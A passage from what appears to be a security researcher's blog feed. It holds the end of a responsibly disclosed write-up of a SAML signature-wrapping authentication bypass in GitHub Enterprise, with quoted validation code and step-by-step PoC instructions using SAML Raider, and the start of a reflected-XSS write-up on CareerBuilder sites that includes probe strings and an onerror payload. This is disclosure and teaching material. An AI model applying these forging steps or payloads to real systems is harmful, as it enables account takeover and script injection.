&lt;span class="n"&gt;subj_conf_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;at_xpath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;//Subject/SubjectConfirmation&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;at_xpath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;//Subject/SubjectConfirmation/SubjectConfirmationData&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;would take their values from the Forged Assertion(!!!) since it was the first child of the SAML Response document.&lt;/p&gt;
&lt;p&gt;Now that the Response object is built, &lt;cite&gt;get_auth_failure_result(saml_response, request, log_data)&lt;/cite&gt; is called as we've seen above also&lt;/p&gt;
&lt;pre class="code ruby literal-block"&gt;
&lt;span class="k"&gt;unless&lt;/span&gt; &lt;span class="n"&gt;saml_response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;valid?&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
  &lt;span class="ss"&gt;:issuer&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;configuration&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:issuer&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="ss"&gt;:idp_certificate&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;idp_certificate&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="ss"&gt;:sp_url&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;configuration&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:sp_url&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="n"&gt;log_auth_validation_event&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;log_data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;failure - Invalid SAML response&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;saml_response&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="no"&gt;GitHub&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;Authentication&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;Result&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;failure&lt;/span&gt; &lt;span class="ss"&gt;:message&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;INVALID_RESPONSE&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;The &lt;cite&gt;valid?&lt;/cite&gt; method of &lt;cite&gt;saml_response&lt;/cite&gt; actually calls validate from /lib/saml/message.rb&lt;/p&gt;
&lt;pre class="code ruby literal-block"&gt;
&lt;span class="c1"&gt;# Public: Validates schema and custom validations.&lt;/span&gt;
&lt;span class="c1"&gt;#&lt;/span&gt;
&lt;span class="c1"&gt;# Returns false if instance is invalid. #errors will be non-empty if&lt;/span&gt;
&lt;span class="c1"&gt;# invalid.&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;valid?&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{})&lt;/span&gt;
  &lt;span class="n"&gt;errors&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;clear&lt;/span&gt;
  &lt;span class="n"&gt;validate_schema&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;validate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="n"&gt;errors&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;empty?&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;and &lt;cite&gt;validate&lt;/cite&gt; is implemented in &lt;cite&gt;/data/github/current/lib/saml/message/response.rb&lt;/cite&gt;&lt;/p&gt;
&lt;pre class="code ruby literal-block"&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;validate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="no"&gt;SAML&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mocked&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:skip_validate_signature&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:idp_certificate&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
      &lt;span class="n"&gt;validate_has_signature&lt;/span&gt;
      &lt;span class="n"&gt;validate_signatures&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:idp_certificate&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;end&lt;/span&gt;
    &lt;span class="n"&gt;validate_issuer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:issuer&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;validate_destination&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:sp_url&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;validate_recipient&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:sp_url&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;validate_conditions&lt;/span&gt;
    &lt;span class="n"&gt;validate_audience&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:sp_url&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;validate_name_id_format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:name_id_format&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Here is where the second part of the problem manifests and where the signature verification logic gets its view of the SAML Response:&lt;/p&gt;
&lt;p&gt;&lt;cite&gt;validate_has_signature&lt;/cite&gt; looks like this:&lt;/p&gt;
&lt;pre class="code ruby literal-block"&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;validate_has_signature&lt;/span&gt;
    &lt;span class="n"&gt;namespaces&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="s2"&gt;&amp;quot;ds&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://www.w3.org/2000/09/xmldsig#&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="s2"&gt;&amp;quot;saml2p&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;urn:oasis:names:tc:SAML:2.0:protocol&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="s2"&gt;&amp;quot;saml2&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;urn:oasis:names:tc:SAML:2.0:assertion&amp;quot;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;unless&lt;/span&gt; &lt;span class="n"&gt;document&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;at&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;//saml2p:Response/ds:Signature&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;namespaces&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt;
           &lt;span class="n"&gt;document&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;at&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;//saml2p:Response/saml2:Assertion/ds:Signature&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;namespaces&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
      &lt;span class="nb"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;errors&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Message is not signed. Either the assertion or response or both must be signed.&amp;quot;&lt;/span&gt;
    &lt;span class="k"&gt;end&lt;/span&gt;
  &lt;span class="k"&gt;end&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;tt class="docutils literal"&gt;//saml2p:Response/saml2:Assertion/ds:Signature&lt;/tt&gt; matches the legitimate assertion just fine so the method does not add anything to self.errors&lt;/p&gt;
&lt;p&gt;Then, &lt;cite&gt;validate_signatures&lt;/cite&gt;&lt;/p&gt;
&lt;pre class="code ruby literal-block"&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;validate_signatures&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;certificate&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;certificate&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;OpenSSL&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;X509&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;Certificate&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;certificate&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;unless&lt;/span&gt; &lt;span class="n"&gt;signatures&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;all?&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;signature&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;signature&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;valid?&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;certificate&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
      &lt;span class="nb"&gt;puts&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;digest mismatch&amp;quot;&lt;/span&gt;
      &lt;span class="nb"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;errors&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Digest mismatch&amp;quot;&lt;/span&gt;
    &lt;span class="k"&gt;end&lt;/span&gt;
  &lt;span class="k"&gt;end&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;uses &lt;cite&gt;signatures&lt;/cite&gt; that comes from &lt;tt class="docutils literal"&gt;/data/github/current/lib/saml/message.rb&lt;/tt&gt;&lt;/p&gt;
&lt;pre class="code ruby literal-block"&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;signatures&lt;/span&gt;
  &lt;span class="n"&gt;signatures&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;document&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;xpath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;//ds:Signature&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;Xmldsig&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;NAMESPACES&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="n"&gt;signatures&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;reverse&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;collect&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
    &lt;span class="no"&gt;Xmldsig&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;Signature&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="k"&gt;end&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="o"&gt;[]&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;which matches the signature of the Legitimate Assertion in our forged SAML Response since it's the only one there and &lt;tt class="docutils literal"&gt;valid?&lt;/tt&gt; from
&lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;Xmldsig::Signature&lt;/span&gt;&lt;/tt&gt; validates successfully the signature against the Identity Provider signing certificate (public key) since the legitimate assertion did come from the valid IdP.&lt;/p&gt;
&lt;p&gt;Back to &lt;tt class="docutils literal"&gt;validate&lt;/tt&gt; of &lt;tt class="docutils literal"&gt;response.rb&lt;/tt&gt;, all of the below&lt;/p&gt;
&lt;pre class="code ruby literal-block"&gt;
&lt;span class="n"&gt;validate_issuer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:issuer&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;validate_destination&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:sp_url&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;validate_recipient&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:sp_url&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;validate_conditions&lt;/span&gt;
&lt;span class="n"&gt;validate_audience&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:sp_url&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;validate_name_id_format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:name_id_format&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;would return true as they operate on data of the Forged Assertion and the attacker can freely control them to be valid.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="id2"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id19"&gt;PoC&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;The code/toolset that I was using for testing is not yet in a form to be released/shared (hopefully soon) so I used &lt;a class="reference external" href="https://github.com/SAMLRaider/SAMLRaider"&gt;SAML Raider&lt;/a&gt; in order to describe a PoC with steps to be reproduced by Github Security team.&lt;/p&gt;
&lt;ol class="arabic"&gt;
&lt;li&gt;&lt;p class="first"&gt;Set up GHE for SAML authentication with a SAML Identity Provider of
your liking.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Install Burp Suite and SAML Raider plugin and start Burp Suite&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Configure your browser to use Burp Suite as proxy&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Start the login process to GHE&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Intercept the SAML Authn Request and forward&lt;/p&gt;
&lt;div class="figure"&gt;
&lt;img alt="SAML Authentication Request" src="/images/xsw1.png" style="width: 60%;" /&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Login at your Identity Provider as a valid user&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Intercept the SAML Response&lt;/p&gt;
&lt;div class="figure"&gt;
&lt;img alt="SAML Authentication Response" src="/images/xsw2.png" style="width: 80%;" /&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;In the SAML Raider window select XSW3 from the available attacks and
click on &amp;quot;Apply XSW&amp;quot;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Check the SAML response below to see that it is changed, and change
the name in the Subject of the Assertion with ID
&lt;tt class="docutils literal"&gt;_evil_assertion_ID&lt;/tt&gt; to something else ( i.e. &amp;quot;victim_account&amp;quot;)&lt;/p&gt;
&lt;div class="figure"&gt;
&lt;img alt="Forge Assertion" src="/images/xsw3.png" style="width: 80%;" /&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Click Forward and check that you are logged in as &lt;tt class="docutils literal"&gt;victim_account&lt;/tt&gt;&lt;/p&gt;
&lt;div class="figure"&gt;
&lt;img alt="Logged in as victim" src="/images/xsw4.png" style="width: 80%;" /&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;div class="section" id="exploitability"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id20"&gt;Exploitability&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;An attacker can bypass authentication given one of the following is true&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;The attacker is an existing user of a GHE instance that uses SAML authentication.&lt;/li&gt;
&lt;li&gt;The attacker is an existing user of a SAML Identity Provider that is configured as a trusted Identity Provider for a GHE instance that
uses SAML authentication&lt;/li&gt;
&lt;li&gt;Or the attacker can get their hands on a valid signed assertion
(&lt;em&gt;only&lt;/em&gt; the signature needs to be valid, the rest can be anything)
from a SAML Identity Provider that is configured as a trusted
Identity Provider for a GHE instance that uses SAML authentication.
Note that this assertion destination can be any other SAML Service
Provider. Possible sources for this can be Identity Provider logs,
other Service Provider logs, mailing list archives, StackOverflow
Questions , etc.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Note that an external attacker has the inherent difficulty as they would need a valid Assertion from a trusted Identity Provider in order to mount the attack. However the fact that the Assertion can be&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;expired&lt;/li&gt;
&lt;li&gt;or even destined to another Service Provider&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;significantly raises the chances.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="impact"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id21"&gt;Impact&lt;/a&gt;&lt;/h4&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;An external attacker taking advantage of this can authenticate to a GHE instance as any user&lt;/li&gt;
&lt;li&gt;An internal attacker taking advantage of this can authenticate to a GHE instance as any user&lt;/li&gt;
&lt;li&gt;An internal attacker taking advantage of this can elevate their rights to admin in a GHE instance&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div class="section" id="id3"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id22"&gt;Disclosure&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;I reported this to Github security via Hackerone on 16th of January. It was acknowledged and triaged after a couple of hours and resolved on January 31st with GHE version &lt;a class="reference external" href="https://enterprise.github.com/releases/2.8.7/notes"&gt;2.8.7&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="timeline"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id23"&gt;Timeline&lt;/a&gt;&lt;/h2&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;2017-01-10: Incorrect XML Signature validation vulnerability discovered and reported&lt;/li&gt;
&lt;li&gt;2017-01-10: Report acknowledged&lt;/li&gt;
&lt;li&gt;2017-01-11: Report triaged&lt;/li&gt;
&lt;li&gt;2017-01-12: Mitigation released with v. 2.8.6 and bounty awarded&lt;/li&gt;
&lt;li&gt;2017-01-16: XSW vulnerability discovered and reported&lt;/li&gt;
&lt;li&gt;2017-01-16: Report acknowledged and triaged&lt;/li&gt;
&lt;li&gt;2017-01-27: Asked for update on mitigation/release&lt;/li&gt;
&lt;li&gt;2017-01-31: Mitigation released with v. 2.8.7 and bounty awarded&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div class="section" id="full-saml-implementation-assessment"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id24"&gt;Full SAML Implementation Assessment&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Following the above reports I received a research grant in order to continue looking into Github's SAML implementation. I performed a full (to the extend that the agreed timeframe and my off-work availability allowed) security audit which uncovered a couple of minor issues and a set of suggestions/recommendations about the implementation in order to minimize the possibility of similar issues in the future.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="outro"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id25"&gt;Outro&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;I enjoyed finding and writing these so I hope if you made it through to the end, you did too. Working with the Github Security guys was a bliss and I can verify first hand that their approach towards their bounty program is as serious and as cool as they describe it on their recent &lt;a class="reference external" href="https://githubengineering.com/githubs-bug-bounty-workflow/"&gt;blog post&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;
</summary><category term="SAML"></category><category term="authentication"></category><category term="XSW"></category></entry><entry><title>Your WAF alone, is not enough, not enough, not enough</title><link href="http://www.economyofmechanism.com/careerbuilder-xss.html" rel="alternate"></link><updated>2016-06-06T17:40:00+03:00</updated><author><name>Ioannis Kakavas</name></author><id>tag:www.economyofmechanism.com,2016-05-27:careerbuilder-xss.html</id><summary type="html">&lt;div class="section" id="tl-dr"&gt;
&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;A number of XSS vulnerabilities were identified in multiple sites owned by CareerBuilder&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="introduction"&gt;
&lt;h2&gt;Introduction&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29"&gt;Cross-site Scripting (XSS)&lt;/a&gt; is not new, not fancy, and sometimes frowned upon by security researchers as low hanging
fruits that are not worth the fuss that is made about them. I'm not exactly sure where I stand on the matter, but I do enjoy the occasional XSS hunt, especially if there is more to it than
entering the payload in a GET parameter and popping the alert box. This is one of a series of posts on XSS vulnerabilities that I have found in some sites that I consider worth sharing, either
because of the target or some complexity/fun in exploiting them.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="careerbuilder"&gt;
&lt;h2&gt;CareerBuilder&lt;/h2&gt;
&lt;p&gt;CareerBuilder, according to them &amp;quot;has the largest online job site in the U.S., but we're more than just a job board. We are the global leader in human capital solutions. Through constant innovation, unparalleled technology, and customer care delivered at every touch point, CareerBuilder helps match the right talent with the right opportunity more often than any other site.&amp;quot;
They have presence in more than 60 countries worldwide&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;www.careerbuilder.com (Alexa ranking : 462 in U.S., 1,741 worldwide)&lt;/li&gt;
&lt;li&gt;www.careerbuilder.co.uk (Alexa ranking :  2.915 in UK)&lt;/li&gt;
&lt;li&gt;www.careerbuilder.es&lt;/li&gt;
&lt;li&gt;www.careerbuilder.fr&lt;/li&gt;
&lt;li&gt;www.careerbuilder.se (Alexa ranking : 943 in Sweden)&lt;/li&gt;
&lt;li&gt;www.kariera.gr (Alexa ranking : 97 in Greece)&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;etc.&lt;/p&gt;
&lt;div class="section" id="reflected-xss"&gt;
&lt;h3&gt;Reflected XSS&lt;/h3&gt;
&lt;p&gt;I started my probing around from &lt;a class="reference external" href="http://www.kariera.gr"&gt;the greek version&lt;/a&gt; in their search field, using my favorite &amp;quot;xxxxx'yyyyy&amp;lt;/img that I have long &amp;quot;stolen&amp;quot; from &lt;a class="reference external" href="http://respectxss.blogspot.com"&gt;Ashar&lt;/a&gt; and saw that none of the &amp;quot;, ', &amp;lt;, / were escaped as can be seen in the following screenshot&lt;/p&gt;
&lt;div class="figure"&gt;
&lt;img alt="&amp;quot;xxxxx'yyyyy&amp;lt;img echoed back unescaped :width: 80 %" src="/images/kariera-1.png" /&gt;
&lt;/div&gt;
&lt;p&gt;It can be seen that the first X and the I are capitalized ( this comes into play later on ). Ok, it looks like it can be exploited, what do we try next?&lt;/p&gt;
&lt;p&gt;So, let's try to add an html tag and see if that goes through. I probe with &amp;lt;img&amp;gt; and get the following:&lt;/p&gt;
&lt;div class="figure"&gt;
&lt;img alt="&amp;lt;img&amp;gt; echoed back escaped :width: 80 %" src="/images/kariera-2.png" /&gt;
&lt;/div&gt;
&lt;p&gt;&amp;lt; and &amp;gt; are replaced by their unicode representation. The same happens with all tags that are closed. So no luck using payloads directly in the search parameter.&lt;/p&gt;
&lt;p&gt;Next I tried invoking JavaScript in the onerror of an &amp;lt;img&amp;gt; tag, as I thought it would not be necessary to close the tag, it would be closed by the next available '&amp;gt; character in the html.
I entered &lt;em&gt;&amp;lt;img src=&amp;quot;X&amp;quot; onerror=&amp;quot;confirm(1);&amp;quot;&lt;/em&gt; and waited for my confirm box to pop, but nothing. I could see the image placeholder in the page,&lt;/p&gt;
&lt;div class="figure"&gt;
